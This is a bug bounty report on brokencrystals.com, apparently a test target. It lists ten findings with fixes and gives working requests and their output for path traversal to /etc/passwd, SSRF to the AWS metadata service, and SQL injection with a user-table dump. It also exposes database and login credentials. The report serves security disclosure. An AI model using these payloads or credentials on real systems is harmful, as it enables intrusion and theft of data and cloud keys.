# Bug Bounty Report — brokencrystals.com
**Date:** 2026-04-03  
**Scanner:** bbhunt.sh (manual vuln verification)  
**Target:** brokencrystals.com (all subdomains)  
**Scope:** brokencrystals.com, *.brokencrystals.com  
**Tech Stack:** NestJS + Fastify (Node.js), PostgreSQL, Keycloak, nginx, AWS EC2  
**Live Hosts:** 16  |  **URLs Collected:** 730  |  **JS Files:** 224  

---

## Summary Table

| # | Severity | Vulnerability | Host | Confirmed |
|---|----------|--------------|------|-----------|
| 1 | CRITICAL | Local File Inclusion / Path Traversal | brokencrystals.com | YES |
| 2 | CRITICAL | SSRF → AWS EC2 IMDS | brokencrystals.com | YES |
| 3 | CRITICAL | Exposed DB Credentials (config.json) | stable, wiz | YES |
| 4 | CRITICAL | SQL Injection — Full DB Dump | all subdomains | YES |
| 5 | HIGH | Exposed .env Files (Laravel) | stable, wiz, qa | YES |
| 6 | HIGH | RCE Endpoint (/api/spawn + GraphQL) | brokencrystals.com | PARTIAL |
| 7 | HIGH | Credentials Exposed in GET URL | brokencrystals.com | YES |
| 8 | HIGH | Open Redirect — /api/goto | brokencrystals.com | CONFIRMED IN HISTORY |
| 9 | HIGH | GraphQL Introspection Enabled | all subdomains | YES |
| 10 | MEDIUM | Keycloak XSS (CVE-2021) × 3 | auth.*, auth.qa.*, auth.stable.* | YES |

---

## CRITICAL Findings

### 1. Local File Inclusion / Arbitrary File Read
**Endpoint:** `GET /api/file?path=<PATH>&type=text`  
**Confirmed:** YES

The `path` parameter is passed directly to the filesystem without sanitization.

**Exploits:**
```bash
# Read /etc/passwd
GET /api/file?path=../../../etc/passwd&type=text
→ root:x:0:0:root:/root:/bin/sh
  bin:x:1:1:bin:/bin:/sbin/nologin
  daemon:x:2:2:daemon:/sbin:/sbin/nologin ...

# Read app process info
GET /api/file?path=/proc/self/cmdline&type=text
→ node dist/main.js

# Read compiled app source
GET /api/file?path=dist/main.js&type=text
→ "use strict"; const _core = require("@nestjs/core"); ...
```

**Impact:** Read any file readable by the app process — source code, environment variables, secrets, private keys.  
**CVSS:** 9.1 (Critical)  
**Remediation:** Validate and whitelist allowed file paths; never pass raw user input to filesystem APIs.

---

### 2. Server-Side Request Forgery (SSRF) → AWS EC2 Instance Metadata
**Endpoint:** `GET /api/file?path=http://169.254.169.254/latest/meta-data/&type=text`  
**Confirmed:** YES — full metadata listing returned

The same `/api/file` endpoint accepts HTTP URLs, proxying requests server-side.

```bash
GET /api/file?path=http://169.254.169.254/latest/meta-data/
→ ami-id
  ami-launch-index
  block-device-mapping/
  events/
  hostname
  iam/           ← IAM credentials accessible
  instance-id
  instance-type
  local-ipv4
  network/
  public-ipv4
  public-keys/
  security-groups
  services/
```

**Next step (not executed):** `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` would yield temporary AWS access keys.  
**Impact:** AWS account takeover via credential exfiltration; internal network scanning.  
**CVSS:** 9.8 (Critical)  
**Remediation:** Block outbound requests to 169.254.169.254/IMDS; enforce IMDSv2; implement SSRF allowlists.

---

### 3. Exposed Database Credentials via config.json
**Endpoints:**
- `https://stable.brokencrystals.com/config.json` [HTTP 200]
- `https://wiz.brokencrystals.com/config.json` [HTTP 200]

**Evidence (full file contents):**
```json
{
  "development": {
    "username": "root", "password": "root",
    "host": "dbhost", "dialect": "mysql"
  },
  "test": {
    "username": "super_admin_lynx",
    "password": "1A2S3D4F5GcvEdX%^&",
    "host": "dbhost-test", "dialect": "mysql"
  },
  "production": {
    "username": "super_admin_lynx",
    "password": "1A2S3D4_F5GcvEdX%^&",
    "host": "dbhost-production", "dialect": "mysql"
  }
}
```

**Impact:** Direct database access using exposed superuser credentials.  
**CVSS:** 9.8 (Critical)  
**Remediation:** Remove config files from web root; use environment variables; add to .gitignore.

---

### 4. SQL Injection — Full Database Exfiltration
**Vectors:**
- GraphQL: `POST /graphql` — `testimonialsCount(query: "<raw SQL>")`
- REST: `GET /api/testimonials/count?query=<raw SQL>`

**Confirmed:** YES — error-based SQLi via GraphQL type mismatch

**Database:** PostgreSQL, current user: `bc`  
**Tables in public schema:** `user`, `testimonial`, `product`

**Full user table dump (confirmed):**
```
Tables: user, testimonial, product

Columns in "user":
  id, created_at, updated_at, email, password, first_name, last_name,
  is_admin, photo, company, card_number, phone_number, is_basic

== USER RECORDS ==
[ADMIN] email=admin | name=admin admin | is_admin=TRUE
  card: 1234 5678 9012 3456 | phone: +1 234 567 890
  pass: $argon2id$v=19$m=65536,t=3,p=4$jmtTCTEcjngErif00RfYAg$biS59Ixnrz...

[USER]  email=user  | name=user user   | is_admin=FALSE
  card: 1234 5678 9012 3456 | phone: +1 234 567 890
  pass: $argon2id$v=19$m=65536,t=3,p=4$hJX1v2kH3UFlEOhZFZn3RQ$oXDFhwgo...
```

**Impact:** Full read access to all users, hashed passwords, card numbers, PII. Likely write access and potential RCE via PostgreSQL extensions (pg_read_file, COPY TO/FROM, etc).  
**CVSS:** 9.8 (Critical)  
**Remediation:** Use parameterized queries / ORM; never accept raw SQL from user input.

---

## HIGH Findings

### 5. Exposed .env Files — Framework Config Disclosure
| Host | File | HTTP Code |
|------|------|-----------|
| `qa.brokencrystals.com` | `/.env` | 200 |
| `wiz.brokencrystals.com` | `/.env` | 200 |
| `stable.brokencrystals.com` | `/.env` | 200 |

**Contents include:** `APP_DEBUG=true`, DB connection settings, Redis config, mail credentials, AWS key placeholders.  
**Impact:** Application config disclosure; `APP_DEBUG=true` exposes stack traces and internal errors.  
**Remediation:** Block `.env` at web server level (`deny all` in nginx); never run `APP_DEBUG=true` in production.

---

### 6. Remote Command Execution Endpoint
**Endpoints:**
- `GET /api/spawn?command=<cmd>` — unauthenticated endpoint (returns empty without auth)
- GraphQL: `getCommandResult(command: String!)` — description: "Launches system command on server"

**Evidence from gau/waybackurls history:**
```
/api/spawn?command=pwd
/api/spawn?command=uname+-a
```

**Status:** Present in URL history; GraphQL schema confirms the functionality. Auth required for confirmed execution.  
**Impact:** Full server compromise if accessible without/with valid auth.  
**Remediation:** Remove entirely — never expose shell exec via HTTP.

---

### 7. Credentials Exposed in GET Request URL
**URL (confirmed in URL history):**
```
GET /api/partners/partnerLogin?username=walter100&password=Heisenberg123
```

**Impact:** Credentials logged in server access logs, CDN logs, browser history, Referer headers.  
**Remediation:** Use POST with request body; never pass auth credentials as query parameters.

---

### 8. Open Redirect — /api/goto
**Endpoint:** `GET /api/goto?url=<target>`  
**URL history confirms:** `/api/goto?url=http://google.com`  
**Impact:** Phishing, OAuth token hijacking via redirect_uri.  
**Remediation:** Whitelist allowed redirect destinations or require same-origin.

---

### 9. GraphQL Introspection Enabled (Production)
**Schema queries accepted on all subdomains.**

**Sensitive schema entries exposed:**
- `getCommandResult(command: String!)` — "Launches system command on server"
- `testimonialsCount(query: String!)` — "Returns count based on provided SQL query" ← SQLi vector
- `viewProduct` — header injection via `x-product-name`

**Remediation:** Disable introspection in production GraphQL configuration.

---

## MEDIUM Findings

### 10. Keycloak CVE-2021 — Cross-Site Scripting (3 instances)
**CVE:** CVE-2021 XSS in Keycloak 10.0.0 – 18.0.0  
**Affected endpoints:**
```
https://auth.brokencrystals.com/auth/realms/master/clients-registrations/default
https://auth.qa.brokencrystals.com/auth/realms/master/clients-registrations/default
https://auth.stable.brokencrystals.com/auth/realms/master/clients-registrations/default
```
**Impact:** XSS on the SSO provider — session hijacking for all users using Keycloak auth.  
**Remediation:** Upgrade Keycloak to ≥ 18.0.1.

---

## Recon Summary
| Asset | Count |
|-------|-------|
| Subdomains discovered | 274 resolved (75 unique base) |
| Live HTTPS/HTTP hosts | 16 |
| URLs collected (gau/katana) | 730 |
| JS files | 224 |
| IPs | 129.80.84.189, 54.162.33.90, 34.195.247.9 (AWS) |
| CNAMEs | k8s-default-ingress-697ad5e9f6-716813763.us-east-1.elb.amazonaws.com |

